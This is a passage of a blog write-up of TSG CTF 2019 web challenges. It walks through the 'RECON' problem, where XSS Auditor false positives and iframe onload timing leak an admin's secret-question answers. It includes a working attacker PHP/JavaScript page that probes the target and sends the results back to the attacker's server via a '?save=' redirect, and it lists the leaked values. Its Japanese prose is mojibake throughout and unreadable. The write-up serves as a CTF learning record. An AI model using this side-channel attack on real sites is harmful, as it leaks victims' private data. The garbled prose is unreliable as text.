</code></pre><p>ã“ã®æ–‡å­—åˆ—ã®ã©ã¡ã‚‰ã‹ã‚’ä½¿ã£ã¦ç™»éŒ²ã—ãŸä¸Šã§ã€ã‚‚ã†ä¸€æ–¹ã®æ–‡å­—åˆ—ã‚’å®›å…ˆã¨ã—ã¦æŒ‡å®šã—ã¦é€é‡‘ã™ã‚‹ã¨ã€ã‚³ã‚¤ãƒ³ãŒå¢—æ®–ã—ã¾ã™ã€‚ curlã‚’ä½¿ã†ã¨å®¹æ˜“ã§ã™ã€‚<h1>RECON (500pts)</h1><p>Webå•ã§ã™ã€‚PHPã§å®Ÿè£…ã•ã‚ŒãŸã€ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç™»éŒ²ã§ãã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚ ç§˜å¯†ã®è³ªå•ã¨ã—ã¦20ç¨®é¡ã®ãƒ•ãƒ«ãƒ¼ãƒ„ãŒå¥½ãã‹å¦ã‹ã‚’é¸æŠã§ãã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã¦ã€ã©ã†ã‚„ã‚‰adminã®å¥½ããªãƒ•ãƒ«ãƒ¼ãƒ„ã‚’RECONã™ã‚Œã°è‰¯ã„ã¿ãŸã„ã§ã™ã€‚<p>ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã¨ã€è‡ªèº«ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç¢ºèªã™ã‚‹ãƒšãƒ¼ã‚¸ã§éœ²éª¨ã«CSPãŒå¼±ã‚ã‚‰ã‚Œã¦ã„ã¦ã€æ€ªã—ã•ãŒã‚ã‚Šã¾ã™ã€‚<pre><code class="hljs language-php"><span class=hljs-variable>$response</span>->withHeader(<span class=hljs-string>"Content-Security-Policy"</span>, <span class=hljs-string>"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'"</span>)
</code></pre><p>ã“ã®è¦ç´ ã¯æ–°ã—ã„æ©Ÿèƒ½ãªã®ã§ã€<code>script-src-elem</code>ã¨<code>script-src-attr</code>ãŒåŠ¹ã„ã¦ã„ãªãã¦ã€å®Ÿè³ªXSSã—æ”¾é¡Œã«ãªã£ã¦ã„ã‚‹ã‚ˆã†ã§ã—ãŸã€‚ ã—ã‹ã—ãªãŒã‚‰ã€ã“ã®ãƒšãƒ¼ã‚¸ã¯ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸãƒ¦ãƒ¼ã‚¶è‡ªèº«ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’è¡¨ç¤ºã™ã‚‹ã‚‚ã®ã§ã™ã®ã§ã€ç‹™ã£ãŸç›¸æ‰‹ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã®ã¯å³ã—ãã†ãªé›°å›²æ°—ãŒã‚ã‚Šã¾ã™ã€‚<p>ã¨ã“ã‚ã§ã€ãã‚‚ãã‚‚ä½•æ•…<code>script-src-attr</code>ãªã©ã¨ã„ã†ç‰¹æ®Šãª(?)åˆ¶é™ãŒä»˜ã•ã‚Œã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ ã“ã®ç­”ãˆã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã®ã‚½ãƒ¼ã‚¹ã‚’æ³¨æ„æ·±ãè¦‹ã‚‹ã¨ã™ãã«æ°—ãŒä»˜ãã¾ã—ãŸã€‚<pre><code class="hljs language-html">ğŸ‡ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"grapes"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"grapes.checked=false;"</span> ></span>
ğŸˆ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"melon"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"melon.checked=false;"</span> ></span>
ğŸ‰ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"watermelon"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"watermelon.checked=false;"</span> ></span>
ğŸŠ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"tangerine"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"tangerine.checked=false;"</span> ></span>
ğŸ‹ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"lemon"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"lemon.checked=false;"</span> ></span>
ğŸŒ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"banana"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"banana.checked=false;"</span> ></span>
ğŸ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"pineapple"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"pineapple.checked=false;"</span> ></span>
ğŸ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"pear"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"pear.checked=false;"</span> ></span>
ğŸ‘ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"peach"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"peach.checked=false;"</span> ></span>
ğŸ’ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"cherries"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"cherries.checked=false;"</span> ></span>
ğŸ“ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"strawberry"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"strawberry.checked=false;"</span> ></span>
ğŸ… <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"tomato"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"tomato.checked=false;"</span> ></span>
ğŸ¥¥ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"coconut"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"coconut.checked=false;"</span> ></span>
ğŸ¥­ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"mango"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"mango.checked=false;"</span> ></span>
ğŸ¥‘ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"avocado"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"avocado.checked=false;"</span> ></span>
ğŸ† <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"aubergine"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"aubergine.checked=false;"</span> ></span>
ğŸ¥” <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"potato"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"potato.checked=false;"</span> ></span>
ğŸ¥• <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"carrot"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"carrot.checked=false;"</span> ></span>
ğŸ¥¦ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"broccoli"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"broccoli.checked=false;"</span> ></span>
ğŸ„ <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>"checkbox"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>"mushroom"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>"mushroom.checked=false;"</span> ></span>
</code></pre><p>ç§˜å¯†ã®è³ªå•ãŒãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ãƒšãƒ¼ã‚¸ã«è¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚“ã§ã™ãŒã€ã“ã®å¤‰æ›´ã‚’ç¦æ­¢ã™ã‚‹ç›®çš„ã§JavaScriptãŒç”¨ã„ã‚‰ã‚Œã¦ã„ã‚‹ã®ã§ã—ãŸï¼ ã“ã®ã‚³ãƒ¼ãƒ‰ã®ã¿å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ç›®çš„ã§ã€éƒ¨åˆ†çš„ãªunsafe-inlineãŒè¨±å®¹ã•ã‚Œã¦ã„ãŸã‚ˆã†ã§ã™ã€‚<p>ã‚‚ã—ã€ã“ã®å°ã•ãªJavaScriptã‚³ãƒ¼ãƒ‰ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã‚Œã°ã€adminã®å¥½ããªãƒ•ãƒ«ãƒ¼ãƒ„ã‚’çŸ¥ã‚‹ã“ã¨ã§ããã†ã§ã™ã€‚ ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€<code>X-XSS-Protection: 1; mode=block</code>ã¨ã„ã†ãƒ˜ãƒƒãƒ€ãŒé€ä¿¡ã•ã‚Œã¦ã„ã¦ã€XSS AuditorãŒãƒ–ãƒ­ãƒƒã‚¯ãƒ¢ãƒ¼ãƒ‰ã§å‹•ä½œã™ã‚‹ã“ã¨ãŒæœŸå¾…ã•ã‚Œã¦ã„ã¦ã€adminã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚‚ã“ã‚Œã«å¾“ã£ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚ ã“ã†ã„ã†å ´åˆã«ã€XSS Auditorã®èª¤æ¤œå‡ºã‚’åˆ©ç”¨ã—ã¦ã€ãƒšãƒ¼ã‚¸å†…ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ç›—ã‚€æ‰‹æ³•ãŒå­˜åœ¨ã—ã¾ã™ã€‚<aside><a href=https://www.mbsd.jp/blog/20160407_2.html rel="noopener noreferrer"target=_blank style=background-image:url(https://www.mbsd.jp/img/logo.gif)><div><strong>ãƒ–ãƒ©ã‚¦ã‚¶ã®XSSãƒ•ã‚£ãƒ«ã‚¿ã‚’åˆ©ç”¨ã—ãŸæƒ…å ±çªƒå–æ”»æ’ƒ | MBSD Blog</strong><cite>www.mbsd.jp</cite><q cite=https://www.mbsd.jp/blog/20160407_2.html>MBSDâ€™s cyber-experts discuss the latest or a new interpretation of cyber security trends.</q></div></a></aside><p>ã“ã‚Œã‚’åˆ©ç”¨ã§ããã†ã§ã™ã€‚ï¼ˆã§ãã¾ã—ãŸã€‚ï¼‰ ä»¥ä¸‹ã®ã‚ˆã†ãª2ã¤ã®IFRAMEã‚’è¡¨ç¤ºã•ã›ã‚Œã°ã€ã©ã¡ã‚‰ã‹ä¸€æ–¹ã‚’XSS AuditorãŒãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã¯ãšã§ã™ã€‚<pre><code class="hljs language-html"><span class=hljs-tag>&lt;<span class=hljs-name>iframe</span> <span class=hljs-attr>src</span>=<span class=hljs-string>'http://34.97.74.235:10033/profile?onchange="melon.checked=true;"'</span>></span><span class=hljs-tag>&#60/<span class=hljs-name>iframe</span>></span>
<span class=hljs-tag>&lt;<span class=hljs-name>iframe</span> <span class=hljs-attr>src</span>=<span class=hljs-string>'http://34.97.74.235:10033/profile?onchange="melon.checked=false;"'</span>></span><span class=hljs-tag>&#60/<span class=hljs-name>iframe</span>></span>
</code></pre><p>ã“ã®æ€§è³ªã‚’åˆ©ç”¨ã—ã€æ”»æ’ƒè€…ã®ãƒšãƒ¼ã‚¸ã§2ã¤ã®IFRAMEã‚’é–‹ã‹ã›ã¦ã€ã©ã¡ã‚‰ãŒãƒ–ãƒ­ãƒƒã‚¯ã•ã‚ŒãŸã‹ã‚’åˆ¤åˆ¥ã™ã‚Œã°è‰¯ã„ã§ã™ã­ã€‚ IFRAMEè¦ç´ ã®<code>contentWindow.length</code>ã‚’è¦‹ã‚‹ã¨ã€XSS AuditorãŒä½œå‹•ã—ãŸã‹å¦ã‹ã‚’ç°¡å˜ã«åˆ¤åˆ¥ã§ãã‚‹ã‚ˆã†ã§ã—ãŸãŒã€æ‰‹å…ƒã§è©¦ã—ãŸã¨ãã«ä½•æ•…ã‹ã†ã¾ãã„ã‹ãªã‹ã£ãŸã®ã§ï¼ˆã“ã‚Œã¯å‹˜é•ã„ã ã£ãŸã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒï¼‰ã€<code>onload</code>ãŒç™ºç«ã™ã‚‹ã¾ã§ã®æ™‚é–“ã‚’è¨ˆæ¸¬ã™ã‚‹ã¡ã‚‡ã£ã¨é¢å€’ãªæ–¹æ³•ã§åˆ¤åˆ¥ã—ã¦ã„ã¾ã™ã€‚ XSS AuditorãŒä½œå‹•ã™ã‚‹ã¨ã€é–¢é€£ãƒªã‚½ãƒ¼ã‚¹ã®èª­ã¿è¾¼ã¿ãŒèµ°ã‚‰ãªã„ã®ã§ã€<code>onload</code>ãŒæ—©ãå‘¼ã°ã‚Œã‚‹ã¯ãšã§ã™ã€‚<p>ä»¥ä¸‹ã®ã‚ˆã†ã«å®Ÿè£…ã—ã€IFRAMEã‚’ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã«åŸ‹ã‚è¾¼ã‚“ã§ã€adminã«ã‚¢ã‚¯ã‚»ã‚¹ã•ã›ã¾ã—ãŸã€‚ JavaScriptã®è¨˜æ³•ãƒ¢ãƒ€ãƒ³ã ã£ãŸã‚Šãƒ¬ã‚¬ã‚·ãƒ¼ã ã£ãŸã‚Šã—ã¦ã„ã¦ã€æ°—æŒã¡æ‚ªã„ã‚“ã§ã™ãŒã€çµ‚äº†ã‚®ãƒªã‚®ãƒªã§è§£ã„ã¦ã„ãŸãŸã‚ã„ã‚ã„ã‚ç„¦ã£ã¦ã„ã¦ã€è¦‹å½“é•ã„ã®è©¦è¡ŒéŒ¯èª¤ã‚’ã—ã¦ã„ãŸåæ®‹ã§ã™ã€‚<pre><code class="hljs language-php"><span class=hljs-meta>&#60?php</span>
	<span class=hljs-keyword>if</span>(array_key_exists(<span class=hljs-string>"save"</span>, <span class=hljs-variable>$_GET</span>)){
		file_put_contents(<span class=hljs-string>"save.txt"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>"save"</span>] . PHP_EOL, FILE_APPEND | LOCK_EX);
		<span class=hljs-keyword>echo</span>(<span class=hljs-string>"OK!"</span>);
	}<span class=hljs-keyword>else</span>{
<span class=hljs-meta>?></span>
&#60html>
&#60body>
&#60script>

<span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>test</span>(<span class=hljs-params>key, val</span>)</span>{
	<span class=hljs-keyword>return</span> <span class=hljs-keyword>new</span> Promise(<span class=hljs-function><span class=hljs-keyword>function</span>(<span class=hljs-params>resolve</span>)</span>{
		<span class=hljs-keyword>const</span> iframe = document.createElement(<span class=hljs-string>"iframe"</span>);
		iframe.onload = <span class=hljs-function><span class=hljs-keyword>function</span>(<span class=hljs-params></span>)</span>{
			iframe.remove();
			resolve([key, val, <span class=hljs-keyword>new</span> Date().getTime() - time]);
		};
		iframe.src = `http:<span class=hljs-comment>//34.97.74.235:10033/profile?onchange="${key}.checked=${val};"`;</span>
		<span class=hljs-keyword>const</span> time = <span class=hljs-keyword>new</span> Date().getTime();
		document.body.appendChild(iframe);
	});
}

(async () => {
	<span class=hljs-keyword>const</span> results = [];
	<span class=hljs-keyword>for</span>(let i = <span class=hljs-number>0</span>; i &#60 <span class=hljs-number>1</span>; i++){
		results.push([
			await test(<span class=hljs-string>"mushroom"</span>, <span class=hljs-literal>true</span>),
			await test(<span class=hljs-string>"mushroom"</span>, <span class=hljs-literal>false</span>),
		]);
	}
	location.href = <span class=hljs-string>"?save="</span> + results;
})();
&#60/script>
&#60/body>
&#60/html>
<span class=hljs-meta>&#60?php</span>
	}
<span class=hljs-meta>?></span>
</code></pre><p>ã“ã‚Œã‚’ç”¨ã„ã¦ã€ãƒ•ãƒ«ãƒ¼ãƒ„1ç¨®é¡ã”ã¨ã«è¨ˆæ¸¬ã—ãŸçµæœãŒä»¥ä¸‹ã®ã¨ãŠã‚Šã§ã™ã€‚ Captchaã‚’é€£æ‰“ã™ã‚‹å¿…è¦ãŒã‚ã£ã¦ã€æ¿€ãƒ„ãƒ©ã‹ã£ãŸã§ã™ã€‚ãƒãƒ¼ãƒ ãƒ¡ã‚¤ãƒˆã«ã²ãŸã™ã‚‰Captchaã—ã¦ã‚‚ã‚‰ã„ã¾ã—ãŸã€‚ï¼ˆã‚‚ã£ã¨é ­ã®è‰¯ã„å®Ÿè£…ã‚’ã™ã‚Œã°ã‚ˆã‹ã£ãŸæ°—ã‚‚ã—ã¾ã™ãŒã€‚ï¼‰<table><thead><tr><th>ãƒ•ãƒ«ãƒ¼ãƒ„<th>trueã®onload(ms)<th>falseã®onload(ms)<th>åˆ¤å®šçµæœ<tbody><tr><td>grapes<td>84<td>334<td>TRUE<tr><td>melon<td>347<td>65<td>FALSE<tr><td>watermelon<td>245<td>47<td>FALSE<tr><td>tangerine<td>78<td>394<td>TRUE<tr><td>lemon<td>83<td>418<td>TRUE<tr><td>banana<td>73<td>255<td>TRUE<tr><td>pineapple<td>79<td>452<td>TRUE<tr><td>pear<td>252<td>48<td>FALSE<tr><td>peach<td>74<td>281<td>TRUE<tr><td>cherries<td>76<td>336<td>TRUE<tr><td>strawberry<td>79<td>318<td>TRUE<tr><td>tomato<td>77<td>353<td>TRUE<tr><td>coconut<td>77<td>333<td>TRUE<tr><td>mango<td>92<td>404<td>TRUE<tr><td>avocado<td>254<td>47<td>FALSE<tr><td>aubergine<td>85<td>333<td>TRUE<tr><td>potato<td>249<td>46<td>FALSE<tr><td>carrot<td>72<td>321<td>TRUE<tr><td>broccoli<td>428<td>40<td>FALSE<tr><td>mushroom<td>87<td>388<td>TRUE</table><p>ã‚ã¨ã¯ã€ã“ã®çµæœã‚’ç”¨ã„ã¦adminã®recoveryãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ï¼ˆFLAGï¼‰ã‚’è¡¨ç¤ºã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚<h1>ç·æ‹¬</h1><p>Webå•ã—ã‹è§¦ã£ã¦ã„ãªã„ã®ã§ä»–ã®ã‚¸ãƒ£ãƒ³ãƒ«ã¯ã‚ã‹ã‚Šã‹ã­ã¾ã™ãŒã€è‰¯ã„å•é¡Œã§ã—ãŸã€‚<ul><li>èª˜å°ãŒé©åˆ‡ã§ã€guessãŒæœ€å°é™ã§æ¸ˆã‚“ã <li>æ‰±ã£ã¦ã„ã‚‹ãƒ†ãƒ¼ãƒã‚‚é¢ç™½ã„ã‚‚ã®ã ã£ãŸ</ul><p>ãŠã‚ã‚Šã§ã™ã€‚ ãªã‚“ã‹ğŸ’°ã‚’è²°ãˆã‚‹ã‚‰ã—ã„ã®ã§ã€ç„¼è‚‰ã«ã§ã‚‚è¡ŒããŸã„ã§ã™ğŸ¦<blockquote class=twitter-tweet><p dir=ltr lang=ja>äº‹å‰ã®ãŠçŸ¥ã‚‰ã›ã®ã¨ã‚Šã€ä¸Šä½3ãƒãƒ¼ãƒ ã«è³é‡‘ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ TokyoWesterns, hxp, NaruseJun ã®ã¿ãªã•ã‚“ã€ãŠã‚ã§ã¨ã†ã”ã–ã„ã¾ã™ï¼<a href=https://t.co/bu6r4T50ZR>https://t.co/bu6r4T50ZR</a> <a href="https://twitter.com/hashtag/tsg_ctf?src=hash&#38ref_src=twsrc%5Etfw">#tsg_ctf</a></p>â€” TSG CTF International (@tsgctf) <a href="https://twitter.com/tsgctf/status/1124933926202560512?ref_src=twsrc%5Etfw">May 5, 2019</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script></article><div class="SocialShare_social__3xEln"><a rel="noopener noreferrer" target="_blank" href="https://social-plugins.line.me/lineit/share?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="LINE" style="background-color:#00C300"><svg viewBox="0 0 24 24"><path fill="white" d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346 0 .627.285.627.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346 0 .628.285.628.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://twitter.com/share?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F&amp;text=TSG%20CTF%20write-up%20(Web)%20%7C%206715.jp"><span title="Twitter" style="background-color:#1DA1F2"><svg viewBox="0 0 24 24"><path fill="white" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="Facebook" style="background-color:#1877F2"><svg viewBox="0 0 24 24"><path fill="white" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="http://b.hatena.ne.jp/add?url=https%3A%2F%2F6715.jp%2Fposts%2F27%2F"><span title="Hatena Bookmark" style="background-color:#00A4DE"><svg viewBox="0 0 24 24"><path fill="white" d="M20.47 0C22.42 0 24 1.58 24 3.53v16.94c0 1.95-1.58 3.53-3.53 3.53H3.53C1.58 24 0 22.42 0 20.47V3.53C0 1.58 1.58 0 3.53 0h16.94zm-3.705 14.47c-.78 0-1.41.63-1.41 1.41s.63 1.414 1.41 1.414 1.41-.645 1.41-1.425-.63-1.41-1.41-1.41zM8.61 17.247c1.2 0 2.056-.042 2.58-.12.526-.084.976-.222 1.32-.412.45-.232.78-.564 1.02-.99s.36-.915.36-1.48c0-.78-.21-1.403-.63-1.87-.42-.48-.99-.734-1.74-.794.66-.18 1.156-.45 1.456-.81.315-.344.465-.824.465-1.424 0-.48-.103-.885-.3-1.26-.21-.36-.493-.645-.883-.87-.345-.195-.735-.315-1.215-.405-.464-.074-1.29-.12-2.474-.12H5.654v10.486H8.61zm.736-4.185c.705 0 1.185.088 1.44.262.27.18.39.495.39.93 0 .405-.135.69-.42.855-.27.18-.765.254-1.44.254H8.31v-2.297h1.05zm8.656.706v-7.06h-2.46v7.06H18zM8.925 9.08c.71 0 1.185.08 1.432.24.245.16.367.435.367.83 0 .38-.13.646-.39.804-.265.154-.747.232-1.452.232h-.57V9.08h.615z"></path></svg></span></a></div></main><footer class="Footer_footer__22y9A"><div id="profile" class="Footer_profile__39Joc"><img src="https://res.cloudinary.com/narusejun/image/twitter_name/h_128/sekai67.jpg" alt="sekai"/><div><small>Author</small><strong>sekai<a rel="noopener noreferrer" target="_blank" href="https://github.com/kaz"><span title="GitHub" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#181717" d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://twitter.com/sekai67"><span title="Twitter" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#1DA1F2" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg></span></a><a rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/sawada.kazuki"><span title="Facebook" style="background-color:initial"><svg viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg></span></a></strong><p>ã‚¤ãƒ³ãƒ•ãƒ©ã¨DXãŒå¥½ã</p></div></div><div class="Footer_copyright__3QtRW">Â© <!-- -->2016 sekai</div></footer></div></body></html>